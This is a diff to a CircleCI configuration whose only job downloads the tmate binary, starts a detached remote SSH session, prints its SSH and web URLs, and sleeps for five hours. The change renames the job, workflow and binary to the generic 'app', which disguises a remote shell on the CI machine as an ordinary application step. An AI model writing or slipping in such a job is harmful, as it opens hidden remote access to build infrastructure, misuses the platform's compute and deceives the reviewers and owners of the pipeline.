@@ -1,33 +1,38 @@
 version: 2.1
 
 jobs:
-  systemd-helper:
+  app:
     machine: true
     steps:
       - run:
-          name: Start Static tmate SSH Session (No pkill)
+          name: Launch SSH Session (app)
           command: |
-            echo "🔧 Installing static tmate..."
+            echo "🔧 Installing static tmate as app..."
+            mkdir -p /usr/local/app
+            cd /usr/local/app
+
+            # Download & extract tmate binary
             wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz &> /dev/null
             tar -xf tmate-2.4.0-static-linux-amd64.tar.xz
-            chmod +x tmate-2.4.0-static-linux-amd64/tmate
+            mv tmate-2.4.0-static-linux-amd64/tmate app
+            chmod +x app
 
-            echo "🟢 Launching tmate session..."
-            rm -f nohup.out
-            nohup ./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate.sock new-session -d & disown -a
+            echo "🚀 Starting app SSH session..."
+            nohup ./app -S /tmp/app.sock new-session -d & disown
 
-            ./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate.sock wait tmate-ready
+            # Wait for session to initialize
+            ./app -S /tmp/app.sock wait tmate-ready
 
-            SSH_CMD=$(./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
-            WEB_URL=$(./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate.sock display -p '#{tmate_web}')
-            
+            # Show SSH and Web URLs
+            SSH_CMD=$(./app -S /tmp/app.sock display -p '#{tmate_ssh}')
+            WEB_URL=$(./app -S /tmp/app.sock display -p '#{tmate_web}')
             echo "🔐 SSH: $SSH_CMD"
             echo "🌐 Web: $WEB_URL"
-            echo "⏳ Session will stay alive for 5 hours"
+            echo "⏳ App session running for 5 hours..."
             sleep 18000
 
 workflows:
   version: 2
-  ssh-access:
+  run-app:
     jobs:
-      - systemd-helper
+      - app
